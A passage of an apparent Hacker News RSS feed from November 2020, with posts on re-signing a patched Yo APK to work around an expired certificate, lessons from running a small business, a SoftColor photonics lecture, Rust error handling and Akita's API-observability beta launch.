<![CDATA[Reviving Yo: How to Patch an APK]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25063163">thread link</a>) | @wesleyac
<br/>
November 11, 2020 | https://blog.wesleyac.com/posts/patching-apks | <a href="https://web.archive.org/web/*/https://blog.wesleyac.com/posts/patching-apks">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>
            <p>I got talking to a friend the other day about <a href="https://en.wikipedia.org/wiki/Yo_(app)">Yo</a>, the app where you can send your friends the word "Yo." It's nominally still around, run off donations, but the SSL certificate for the API server has been expired for a little while, so the app doesn't work anymore. Not to worry, though, that's something we can fix by patching the APK pretty quickly.</p>

<p>First, <a href="https://play.google.com/store/apps/details?id=com.justyo">download Yo on the Play Store</a>. Then, download <a href="https://play.google.com/store/apps/details?id=com.ext.ui">APK Extractor</a>, and use it to download the APK off your phone (you'll need to get it onto your computer somehow, I emailed it to myself). You should have a file called <code>Yo_base.apk</code>.</p>

<p>Next, install <a href="https://ibotpeaches.github.io/Apktool/"><code>apktool</code></a>, and use it to decompile the APK:</p>
<div><pre><code data-lang="">apktool if Yo_base.apk
apktool d Yo_base.apk
</code></pre></div>
<p>This should make a directory called <code>Yo_base</code>, which you can edit however you want. I changed <code>https://newapi.justyo.co</code> to <code>http://newapi.justyo.co</code> in <code>res/values/strings.xml</code>, but you could also make other changes as well. Once you've done that, recompile the APK like so:</p>

<p>Now there should be a <code>Yo_base/dist/Yo_base.apk</code> file, but it's not signed, so we can't use it. Signing it isn't too tricky though. Using the <code>keytool</code> and <code>jarsigner</code> tools that come with the JDK:</p>
<div><pre><code data-lang="">keytool -genkey -v -keystore my-release-key.keystore -alias alias_name -keyalg RSA -keysize 2048 -validity 10000
jarsigner -verbose -sigalg SHA1withRSA -digestalg SHA1 -keystore my-release-key.keystore Yo_base/dist/Yo_base.apk alias_name
</code></pre></div>
<p>It'll ask you to make a password and enter your name and things, I don't think it really matters what you choose. Once you've done all that, you can move the <code>Yo_base/dist/Yo_base.apk</code> file to your phone, click through all the fuss that Android makes about running a unsigned APK, and start Yoing away! This also works for other apps just as well :)</p>

          </div></div>]]>
            </description>
            <link>https://blog.wesleyac.com/posts/patching-apks</link>
            <guid isPermaLink="false">hacker-news-small-sites-25063163</guid>
            <pubDate>Wed, 11 Nov 2020 21:24:22 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notes on Owning Your Own Business]]>
            </title>
            <description>
<![CDATA[
Score 3 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25062764">thread link</a>) | @rossdavidh
<br/>
November 11, 2020 | https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/ | <a href="https://web.archive.org/web/*/https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page">

<p>So, you want to strike out on your own, and start your own business?  Great!  Here are a few things you might want to know about that.  They are based on my own experience as an independent contractor (computer programmer), what I've seen being married to an owner (with a partner) of a small retail shop, and what I've seen and heard talking to multiple small business owners of various kinds in the last twenty years.  Some of them are successful, some of them were not, and some were successful but didn't like it, and stopped.  The recurring thing I've seen (and my own lived experience) is that owning and running your own business is not what most people think it is like, so perhaps this will be useful to you as you set out on a different path.</p>



<h2>Lesson 1: You Still Have A Boss</h2>
<p>The most important thing to know, is that being a business owner is NOT like being an employee, except without the boss.  This is, I think, the number one misconception that most people have.  In fact, not only do you still have a boss, but your boss:</p>
<ul>
<li>gives you no paid vacation</li>
<li>gives you no paid sick leave</li>
<li>docks your pay if you break the rules</li>
<li>...but doesn't tell you what those rules are</li>
<li>doesn't (generally) pay overtime if you work long hours or on weekends</li>
<li>does (usually) dock your pay if you take off early</li>
<li>may occasionally pay bonuses, but won't tell you ahead of time what you have to do to get them</li>
</ul>

<p>Your boss is, of course, the market.  New small business owners (and even old ones, sometimes) think they get to decide when they will work, and therefore that customers will show up when they want them to.  But in practice, customers show up when THEY want to, and you need to be ready for them.  If you are not, generally speaking, they will go elsewhere or just forego spending entirely.  The same logic applies to all of the rest of the items in the list above.  The market does all of this, and it is up to you to figure it out, because it won't tell you ahead of time.</p>

<p>Which means really, you have to figure out the rules, and impose them on yourself.  So, when owning your own business, it is not as if you no longer have a boss who makes you do stuff you don't want to do.  It's more like, you also have to be that boss, forcing yourself to do things you don't feel like doing, because there isn't anyone else there to tell you to do it.  That's what "being your own boss" really means; it's not the same as not having a boss.  If you aren't able to make yourself do things when they need doing, even though you don't feel like it right then, then being your own boss may not be for you.</p>

<h2>Lesson 2: The Loop</h2>
<p>There is a process, which you need to know about and think about, as you run a small business.  It is a loop, which can be divided into four parts:</p>
<ol>
<li>Try something (typically involves spending $$ and/or time)</li>
<li>Get results (typically involves receiving $$ or saving time)</li>
<li>Observe that result (notice what just happened)</li>
<li>Plan your next thing to try</li>
</ol>

<img src="https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/loop.png">

<p>It may seem so simple and straightforward, that there's no point in stating it.  But, most business failures can be traced ultimately to one of the following breaks in the loop:</p>
<ul>
<li>Not keeping enough data about what happened (failure in the "observe" step, above)</li>
<li>Not taking time to plan what to do (failure in the "plan" step)</li>
<li>Not actually doing what was planned (failure in the "try" step)</li>
</ul>

<p>Let's look at each of these failures in more detail.</p>
<h3>Failure to Observe</h3>

<img src="https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/loop_without_observe.png">

<p>Part of this, is the common conception that keeping a lot of data about what happened is a drag, and only corporate losers do that sort of thing and starting your own business is all about getting away from that.  Part of it is a failure to understand (per Lesson 1: You Still Have A Boss) that having your own business doesn't mean you get to do whatever you want.  One example I've often seen, is in the decision of what hours a day, and what days of the week, to be open.</p>

<p>Now, it is certainly true that you have the right to close your store whenever you want to.  Perhaps you don't want to be open on Sundays, because your religious beliefs prohibit it.  It's your life.  More typically, though, people just sort of don't want to be open on Sundays, but don't want to pay any penalty for this.  Therefore, they convince themselves that nobody shops on Sundays anyway.  This is, essentially, trying to get out of working on Sundays, without letting your boss see you doing it and docking your pay.  This is employee-type thinking.  Once you are a business owner, not an employee, this way of thinking makes no sense anymore.  If you want to know the cost of not being open on Sundays, you need to collect some data.  For example, you can keep your store open 7 days a week at the beginning, and keep track of how much your sales are each day.  If you do, you will probably find that, just as you want to do a good bit of your shopping on Sunday, so do your (potential) customers.  Sunday is not quite as busy as Saturday, but probably it is more busy than, say, Monday or Tuesday.</p>

<p>But, the lesson is NOT that you should be open on Sundays.  The lesson is that you should not take my word for it, or your own intuition; you should keep track of exactly what happens when you do stay open on Sundays, and look at the cold, hard, unfeeling, pitiless numbers in a spreadsheet before you decide that it's not worth staying open on Sunday.  Of course, if it's a religious thing, or you just don't care about making money, or for whatever other reason you decide to close on Sundays anyway, that is entirely up to you.  But DON'T fail to collect the data.  Don't make decisions based only on your intuition, because when you do that it's the equivalent of the boss asking his employees, "I dunno, should we be open on Sundays?".  What they tell him is based on what they want, not what's good for the business.  You are the boss, and your intuition is like the employees here.  Your intuition will tell you what it wants to be true.  Keep track, numerically, in a spreadsheet, of what happened.  That's what tells you what really is true.</p>

<p>The same logic applies to having a 25% off sale, having a special event at your business, selling a new product, and so forth.  It's your decision, but fortify yourself against wishful thinking by keeping careful, numerical, track of what happened.  You should have, in a spreadsheet, a record of what happened at this time last week, last month, last year.  If sales are slow, is this because they always are slow this time of year?  Or this day of the week?  Or is there something new going on, that you need to look into?  If you spent money to get a new kind of merchandise in your store, how much did you pay for it, and how much did it sell for?  How much do you spend on things, and how much of that goes to waste?  You should know, and you should not rely on your memory or your intuitive hunch.  Put it in a spreadsheet, and look at it.  When it comes time to pay the bills, the bank's computer will take a cold, hard, pitiless look at how much money is in your bank account.  Therefore, you need to be taking a cold, hard, pitiless look at what is working, and what isn't, so that you will be able to pay those bills.</p>

<h3>Failure to Plan</h3>

<img src="https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/loop_without_plan.png">

<p>Let's assume, for the moment, that you have a decent work ethic.  You're willing to hustle to get things done.  This is mostly a good thing, but there is one case where it can get you into trouble, and that's when you're not willing to pause, and plan, because there's so much work to do and you want to get started.  Many times, there are more things that need doing, than there is time to get it all done.  It may seem like this means you need to hustle more.  In fact, it means you need to stop hustling, at least for a little while, and think carefully about what needs to be done first.</p>

<p>Once again,this may mean you end up acting a little like those boring loser corporations that you were wanting to get away from when you decided to start your own business.  Planning, to some people, is boring and seems pointless because nothing gets actually accomplished.  But you don't have enough time, energy, and money to do everything you can think of that needs doing.  When you have your own business, you NEVER run out of things that need doing.  This means you need to carefully plan, and prioritize, so that what you actually do is what is most likely to help.  Just because you are working hard, doesn't mean you are doing what is most important right then.  Make a list of all the things that need doing, put them in an order from highest priority to lowest, and start from the top.  Don't work on the first thing you happen to see that needs doing.  Work on the thing at the top of the list of priorities, and leave some time in your schedule for making sure that list is right.  Is the thing at the top more important than what is below it?  If you cannot get everything done, is the stuff at the top of your list what you would choose to do?  Or will you discover that you have been sprinting nonstop for weeks and much of what you did turned out to be pointless, because (for example) you spent a lot of time painting the great looking sign for your bakery's special Easter sidewalk sale, but never got the permit from the city to have a sidewalk sale so you cannot do that, and the time spent on painting that sign is wasted.  Work on the most necessary things first, and realize that not everything you can think of, will get done.  Even though stopping to plan takes away some of your (already insufficient) time, it also helps increase the odds that you are spending your time wisely, and not wasting it.</p>

<p>All of the above discussion about prioritizing your time, also applies to prioritizing your money.  You will run out of money, if you spend it on anything that seems like a good idea.  There are absolutely more sensible-sounding, good ideas to spend your money on, than you have money.  So prioritize.  You cannot run your business, if you don't pay rent.  You cannot …</p></div>
<br/><p><em>Article truncated for RSS feed. Read the full article at <a href="https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/">https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/</a></em></p>]]>
            </description>
            <link>https://www.rosshartshorn.net/stuffrossthinksabout/small_bus_blog_post/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25062764</guid>
            <pubDate>Wed, 11 Nov 2020 20:45:24 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Software engineering photonics and color science]]>
            </title>
            <description>
<![CDATA[
Score 7 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25062325">thread link</a>) | @pete314
<br/>
November 11, 2020 | https://www.softcolorsoftware.com/resources/software-engineering-photonics-and-color-science/ | <a href="https://web.archive.org/web/*/https://www.softcolorsoftware.com/resources/software-engineering-photonics-and-color-science/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div>


<hr><h2>Software engineering photonics and color science</h2>

<p>

<img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science.png">

</p>
<p>Hi everybody, I am Petri Piirainen, a co-founder and chief technology officer of SoftColor company. Welcome to this video lecture about SoftColor's fifteen-year software engineering photonics and color science story. </p>

<p>This lecture is part of the University of Eastern Finland's photonics applications course and lecture series. </p>

<p>Since 2005 we have made photo editing automation software. Our photonics journey is slightly different from traditional optics-focused companies, which you have met during this lecture series. </p>

<p>During this lecture, I will tell you what we have learned about developing and selling photonics applications. </p>

<hr><h2>My history with photonics and software engineering </h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_2.png"></p><p>I have an MSc degree in computer science (from the University of Eastern Finland). I studied computer science in a digital signal processing program, and then I had mandatory applied mathematics and physics as minor studies. With physics studies, there was a lot of photonics and color science courses. </p>

<p>I started by software business and engineering career during high school in the 90s.  In 2005 we founded SoftColor Oy, and since that, we have developed faster, easier, and better photo editing automation software.</p>


<hr><h2>Photonics applications: What have we learned?</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_3.png"></p><p>First, I would like to talk a little bit about photonics applications, the beauty and the beast of engineering photonics applications. We have learned that developing useful photonics applications is very hard and requires a lot of engineering and math knowledge. It is challenging because photonics applications (software or hardware) usually have to quickly process tons of data and calculations. </p>

<hr><h2>Technical elements of useful photonics application</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_4.png"></p><p>My favorite thing with photonics is that all photonics applications contain four types of engineering. </p>
<ul>
<li>Physics</li>
<li>Mathematics</li>
<li>Electrical engineering</li>
<li>Computer science </li>

</ul>

<p>But there is also one thing, which is fascinating.  All photonics applications require a lot of arts too.</p>

<ul>
<li>Image quality</li>
<li>Industrial design</li>
<li>User experience</li>
<li>User interaction</li>
<li>User interfaces</li>

</ul>

<p>This mixture of arts and engineering is my main topic for you today.</p>

<hr><h2>Topics</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_5.png"></p><p>My topics today are:</p>

<ul>
<li>A short history and introduction to our company</li>
<li>What we do and how products work</li>
<li>How have we mixed photonics with software engineering</li>
<li>What we learned about to make useful photonics applications</li>
<li>And there will be a bonus "homework" for  you</li>

</ul>


<hr><h2>Story of SoftColor Oy</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_6.png"></p><p>Let's have a quick look at our products and technology. </p>

<hr><h2>What we do</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_7.png"></p><p>We make faster, easier, and better photo edition automation software. Our software runs on Windows PCs and servers.</p>

<hr><h2>SoftColor Oy</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_8.png"></p><p>We founded SoftColor in 2005, so our company is now a teenager. </p>

<p>We have three products: Automata Server, Automata Pro, and PhotoEQ.</p>

<p>We are located in Joensuu, Finland. </p>

<hr><h2>Our business</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_9.png"></p><p>We sell our software on the internet. And all our products are free to try before buying.  Our customers are:</p>

<ul>
<li>Printing industry</li>
<li>Photographers</li>
<li>360 photography</li>
<li>Newspapers</li>
<li>Ad agencies</li>
<li>Repro</li>
<li>Real estate</li>
<li>Car retail</li>
<li>Photo editors</li>
<li>Office workers</li>
<li>Developers</li>

</ul>

<p>Our customers are from the English speaking world. But we have a lof customers from Germany and Spain too.</p>

<hr><h2>Our research and development</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_10.png"></p><p>Our research and development work is to make our photo editing automation software faster, more comfortable, and better to use.</p>

<hr><h2>SoftColor engine </h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_11.png"></p><p>Our applications use the SoftColor engine. It is the brains and heart of our software. </p>

<p>SoftColor engine does all photo editing automation tasks, color correction, image editing, and color management. </p>

<p>To get this automation working. We have combined computer vision, color science, computer graphics, digital signal processing, and machine learning techniques into one packet. </p>

<p>This combination of different engineering tools has made our photo editing automation to work very well.</p>

<hr><h2>How does our color and tone correction work?</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_12.png"></p><p>Let's check how our photo enhancement automation works, with good or bad photos. </p>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_13.png"></p><p>We can fix white balance, exposure, and contrast problems automatically. Results are very natural and good looking.</p>

<p>Our correction works with challenging photos too.</p>

<p>Our white balance correction will you very natural results.</p>

<p>It works with all kinds of photos and cameras.</p>

<p>You will never lose any shots. We can fix them.</p>

<hr><h2>SoftColor and photonics</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_14.png"></p><p>Let's talk a little bit about photonics. </p>

<hr><h2>We are processing colors, not pixels.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_15.png"></p><p>To get photo editing automation working better. We have learned computers to process colors, not pixels. </p>

<hr><h2>A good photo is a combination of art and science.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_16.png"></p><p>The most challenging part of photo editing automation is to get results that make our customers happy. The problem is that the excellent photo is a combination of art and science. There is eighty percent of art in the superb picture and only twenty percent of engineering.  </p>

<p>For this problem, we managed to create an excellent solution.</p>

<hr><h2>Traditional image editing and photonics</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_17.png"></p><p>There is photonics behind every camera, display, and photo-editing algorithms. </p>

<hr><h2>SoftColor engine and photonics</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_18.png"></p><p>We have changed to traditional photo editing. We built our engine to take colors first.  This solution has helped us to make better photo enhancement automation.</p>

<hr><h2>We have made a color correction automation that has tools for science and art.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_19.png"></p><p>Our applications offer tools to our customers to combine art and science with photo editing automation. </p>

<p>Science part:</p>

<ul>
<li>Layer based processing</li>
<li>Statistical analysis </li>
<li>Metadata analysis</li>
<li>Machine vision</li>
<li>Machine learning</li>

</ul>

<p>and the arts:</p>

<ul>
<li>Color grading for mass photo processing</li>
<li>Selective color adjustments </li>
<li>No workflow limitations</li>

</ul>

<hr><h2>SoftColor engine benefits</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_20.png"></p><p>We are processing the colors, not pixels. This approach gives three significant benefits:</p>

<ul>
<li>More accurate automatic correction</li>
<li>Batch color grading for photos</li>
<li>Easier and accurate customization</li>

</ul>


<hr><h2>SoftColor engine technical details</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_21.png"></p><p>Let's take a look inside our engine.</p>

<hr><h2>Layer based processing</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_22.png"></p><p>We use layers based processing, which means that all correction and image processing tools are separate layers. </p>

<p>You will full control of how each step works. For automatic color and tone correction, we have six layers. </p>

<ul>
<li>Rich dynamics enhancer</li>
<li>Luminosity enhancer</li>
<li>White balance </li>
<li>Natural color temperature</li>
<li>Exposure and contrast</li>
<li>Color grading</li>

</ul>


<hr><h2>Spectral illumination estimation technology for better color correction</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_23.png"></p><p>To get better automatic results for all kinds of photos. We have developed spectral illumination estimation technology. </p>

<hr><h2>Same parameters for human and computer</h2>
<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_24.png"></p><p>We use spectral illumination detection to create the same parameters for the user and the computer. </p>

<p>We calculate these parameters from the original image by using:</p>

<ul>
<li>Spectral  illumination estimation from RGB image</li>
<li>Metadata analysis EXIF &amp; camera data</li>
<li>Machine learning for estimated data</li>

</ul>

<p>From this data, we generate parameters for automatic correction.</p>

<p>When users change parameters, they will alter the same settings as our automatic correction uses.</p>

<p>The solution is possible by mixing spectral illumination data with computer graphics techniques.</p>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_25.png"></p><hr><h2>What we have learned about photonics applications during the last fifteen years</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_26.png"></p><p>There six things which we have learned. Which are the requirements for good photonics software or hardware applications.</p>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_27.png"></p><ol>
<li>Software is the glue for photonics applications</li>
<li>Optical engineering</li>
<li>Software engineering</li>
<li>Electrical engineering</li>
<li>User experience engineering</li>

</ol>

<p>These are things and skills which are required. But there is always one challenge, battery, and CPU limitations.  It is the reason why we all need to tune our algorithms, software, and hardware better every day.</p>

<hr><h2>Bonus "homework." Useful resources for your entrepreneur career</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_28.png"></p><p>There has been a lot of questions about how to get started with the photonics business.  Here are two great resources to read or watch.</p>


<hr><h2>To watch "Halt and Catch Fire" tv-series.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_29.png"></p><p>Halt and Catch Fire is an excellent and very realistic business world tv-series.  The tv-series follows some players in the 80s technological revolution that lead to an information society. It is quite an unknown series, but now it is available in streaming services. </p>



<p>You will learn a lot about the hardware and software business. </p>

<p>The tv-series covers the following useful topics:</p>

<ul>
<li>Venture capital</li>
<li>Bootstrapping</li>
<li>Human resources</li>
<li>Risk management </li>
<li>Work/life balance</li>
<li>Legal stuff (due diligence, intellectual property rights, revenge engineering process) </li>
<li>Fortune 500 vs. startup life </li>

</ul>

<p>And there is a lot of 80s and 90s retro computing and nostalgia too.</p>

<p>
<a href="https://en.wikipedia.org/wiki/Halt_and_Catch_Fire_(TV_series)" target="_blank">Halt and Catch Fire in Wikipedia</a>
</p>


<hr><h2>To read "Masters of Doom" book.</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_30.png"></p><p>Masters of Doom book tells the story of ID software. The makers of Wolf3D, Doom, and Quake games. </p>

<p>There are fascinating stories about how small teams can change the world. For the photonics industry, there is interesting how ID software took the latest research topics from computer graphics and science. And how they utilized them to make their games better.</p>

<p>This book is also available as an audiobook.</p>

<p>
<a href="https://en.wikipedia.org/wiki/Masters_of_Doom" target="_blank">Masters of Doom book in Wikipedia</a>
</p>


<hr><h2>Summary </h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_31.png"></p><p>That was our 15 years story with software engineering, photonics, and color science. I hope that you have learned something new for photonics career or business.</p>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_32.png"></p><p>Here is a summary of the main topics:</p>

<ul>
<li>A good photo is a combination of art and science</li>

</ul>

<ul>
<li>Software is the glue for photonics applications.</li>

</ul>

<ul>
<li>Photonics is a mixture of science, engineering, and arts.</li>

</ul>

<hr><h2>Feedback and comments</h2>

<p><img src="https://www.softcolorsoftware.com/images/Software_engineering_photonics_and_color_science_33.png"></p><p>
It would be great to hear your feedback about this lecture! <a href="https://www.softcolorsoftware.com/contact/">
</a></p><a href="https://www.softcolorsoftware.com/contact/">
</a><center><a href="https://www.softcolorsoftware.com/contact/">
Just drop us a message.</a>
</center>


</div></div>]]>
            </description>
            <link>https://www.softcolorsoftware.com/resources/software-engineering-photonics-and-color-science/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25062325</guid>
            <pubDate>Wed, 11 Nov 2020 20:02:38 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Rust as a productive high-level language]]>
            </title>
            <description>
<![CDATA[
Score 4 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25062055">thread link</a>) | @praveenperera
<br/>
November 11, 2020 | https://omarabid.com/rust-high-level-language | <a href="https://web.archive.org/web/*/https://omarabid.com/rust-high-level-language">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><section id="container">
  <article id="wBiL7EUi4Kw16ahNjk6hmU">
	<time datetime="2020-11-10">November 10, 2020</time>
  
	<p>Rust is often critiqued as a <a href="https://news.ycombinator.com/item?id=24536645">not a very productive</a> programming language. It is true that there is a bit of a learning curve to be able to program in Rust; but beyond that, I think it pays off in productivity; and massively I must say.</p>

<p>I haven’t been using Rust for production much; maybe a bit more than a year. The static type checks means I’m getting much less bugs in my code, and spend considerably less time in debugging. I can safely say that, for me, Rust is more productive than JavaScript, PHP or Python and the margin keeps getting larger as I get more acquainted with the ecosystem.</p>

<hr>

<p>To entice your interest, here is a situation that I handled lately: I have a program that writes logs to <a href="https://en.wikipedia.org/wiki/Syslog">syslog</a> and the terminal. The program compiles and functions correctly on my development machine. However, it returned an error when I deployed it to an <a href="https://alpinelinux.org/">Alpine</a> Docker container. Turns out, Alpine doesn’t have a running syslog service by default.</p>

<p>Now that’s fine, the program functioned correctly. But I don’t care much for syslog on deployment since the program is running inside a container. One solution is to remove the syslog <a href="https://en.wikipedia.org/wiki/Sink_(computing)">drain</a> but I need that for development. I can use <a href="https://doc.rust-lang.org/reference/conditional-compilation.html">conditional compilation</a>; but there is a better option: If syslog fails, for whatever reason, just ignore that and move on.</p>

<p>So let’s take a look at the old code. </p>

<pre><code>    let syslog_drain = syslog_drain()?;
    let term_drain = term_drain()?;
</code></pre>

<p>This code creates two logging drains: one for syslog and one for the terminal. It uses the <a href="https://doc.rust-lang.org/edition-guide/rust-2018/error-handling-and-panics/the-question-mark-operator-for-easier-error-handling.html">? operator</a> to evaluate the result. If the function returns an error, execution will stop and the error bubbles back to the top of the program.</p>

<p>I have no idea how the syslog or any particular drain fails. And honestly, I don’t want to get into these details. What I want is to check if there is a failure; and if so ignore that particular drain. Or return a <a href="https://docs.rs/slog/2.5.2/slog/struct.Discard.html">Discard drain</a>.</p>

<p>The <a href="https://doc.rust-lang.org/std/result/">Result</a> type and <code>? operator</code> make this particularly easy. So here is the code that does that.</p>

<pre><code>    let syslog_drain = syslog_drain().unwrap_or(discard_drain()?);
    let term_drain = term_drain().unwrap_or(discard_drain()?);
</code></pre>

<p>And that’s it. This code now compiles and runs correctly. If syslog is running, it’ll write logs to syslog and the terminal. Otherwise, it’ll write logs to the terminal and syslog is skipped. There are no conditions, no complicated checks and it’s perfectly readable.</p>

<hr>

<p>There is more to Rust productivity than that. Macros, Iterators, Advanced Traits and Types, the new Async system. Once you are comfortable with all of these, you are now able to be productive, safe and fast.</p>

  <figure id="kudo_wBiL7EUi4Kw16ahNjk6hmU">
    <a href="#kudo">
      
    </a>
    <p>140</p>
    <p>Kudos</p>
  </figure>
  <figure id="kudo_side_wBiL7EUi4Kw16ahNjk6hmU">
    <a href="#kudo">
      
    </a>
    <p>140</p>
    <p>Kudos</p>
  </figure>
</article>

</section></div>]]>
            </description>
            <link>https://omarabid.com/rust-high-level-language</link>
            <guid isPermaLink="false">hacker-news-small-sites-25062055</guid>
            <pubDate>Wed, 11 Nov 2020 19:40:41 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Notion Timeline View]]>
            </title>
            <description>
<![CDATA[
Score 309 | Comments 183 (<a href="https://news.ycombinator.com/item?id=25061781">thread link</a>) | @AlphaWeaver
<br/>
November 11, 2020 | https://www.notion.so/guides/timeline-view-unlocks-high-output-planning-for-your-team | <a href="https://web.archive.org/web/*/https://www.notion.so/guides/timeline-view-unlocks-high-output-planning-for-your-team">archive.org</a>
<br/><!-- hnss:readable-content --><hr/>Unable to extract article]]>
            </description>
            <link>https://www.notion.so/guides/timeline-view-unlocks-high-output-planning-for-your-team</link>
            <guid isPermaLink="false">hacker-news-small-sites-25061781</guid>
            <pubDate>Wed, 11 Nov 2020 19:15:37 GMT</pubDate>
        </item>
        <item>
            <title>
<![CDATA[Source Code Is Not the Whole Story: Understanding Software Through APIs]]>
            </title>
            <description>
<![CDATA[
Score 10 | Comments 0 (<a href="https://news.ycombinator.com/item?id=25061745">thread link</a>) | @jeanyang
<br/>
November 11, 2020 | https://www.akitasoftware.com/blog/2020/11/10/kbgnmpu9bdi6qsgkkxo1amqptellna | <a href="https://web.archive.org/web/*/https://www.akitasoftware.com/blog/2020/11/10/kbgnmpu9bdi6qsgkkxo1amqptellna">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div data-block-type="2" id="block-0b8680fe602586cc73eb"><div><p>👋 hunters!</p><p>After putting out an early iteration a few months ago, we’re excited to officially launch our private beta—and to make our docs public for the first time!</p><p>And we'd like to give a big thank-you to all the users and friends of Akita who got us here. 😊<br></p><h2><strong>🚗 How we got here</strong></h2><p>In 2018, I was a <a href="http://jeanyang.com/">CS professor at Carnegie Mellon University</a>. When Cambridge Analytica hit, I started asking friends in industry how they knew what data their apps were sending around. It turned out that there was no good solution for understanding interactions across APIs—not just for privacy and security but also for reliability and diagnostics. When I realized that this was the exact problem I’d been teeing up to solve, I took leave from my job, sold my furniture, and drove across the country to start Akita.</p><p>There is now a small team of us working on Akita, coming from places like Twilio and Amazon. Our team’s experience building in service-oriented environments made everyone especially excited to build a product that would help developers move faster together.</p><h2><strong>🔎 Source code isn’t the whole story.</strong></h2><p>At Akita, we believe the way to understand your software is through your APIs. Our solution builds dynamic models of API behavior to automatically:</p><p>✅Catch breaking changes on every pull request<br>✅Generate specs for any API<br>✅Update API specs on every pull request<br>✅Discover and document endpoints</p><h2>🏗 <strong>How we built it</strong></h2><p>From the beginning of Akita, I knew where I wanted us to go: automatically map out the graph of API interactions. This would be key to improving reliability, diagnostics, and security in modern web apps.</p></div></div><div data-block-type="2" id="block-yui_3_17_2_1_1605055841399_25008"><div><p>What we didn’t know was exactly how we would get there. Should we integrate with a tracing library? Should we build a proxy?</p><p>After <a href="https://blog.sigplan.org/2020/10/27/whats-the-role-of-developer-experience-in-programming-languages-research/">talking with dozens of developers and engineering leaders</a>, we came up with three main requirements. First, whatever we built needed to work with any tech stack. Second, people needed to be able to integrate our solution in minutes. Finally, we wanted something that could run in production without adding overhead or exposing sensitive data. These were not easy requirements to balance!</p><p>After over a year of building, we’re super excited to launch a solution that requires no code changes, no proxies, works with any language, and integrates in just minutes. Akita works by watching API traffic, analyzing, and sanitizing the traffic locally to share only metadata back to our cloud. This means you can Akita deploy Akita anywhere: your laptop, CI/CD, or production—without having to worry about us seeing your data. We are really proud of our approach and believe it is the future of cloud observability.</p><p>And for those who are curious, our tech stack is Go, typed Python, and React. 😊</p><h2><strong>💖 Let’s make software development better</strong></h2><p>We believe that Akita can help anybody with a web app who wants to move quickly without losing customers. We understand that we have a long way to go to achieve the vision—and that the only way to get there is by getting feedback early and often from people like you.</p><p>We’d love to have you <a href="https://www.akitasoftware.com/get-invite?utm_campaign=2020_private_launch&amp;utm_medium=blog&amp;utm_source=2020_11_11_producthunt">try out the private beta</a>! We’ll also be checking the comments on <a href="https://www.producthunt.com/posts/akita-private-beta">ProductHunt</a> for feedback and questions. We look forward to hearing from you.</p><p>Onward ⚡️,<br>Jean Yang (<a 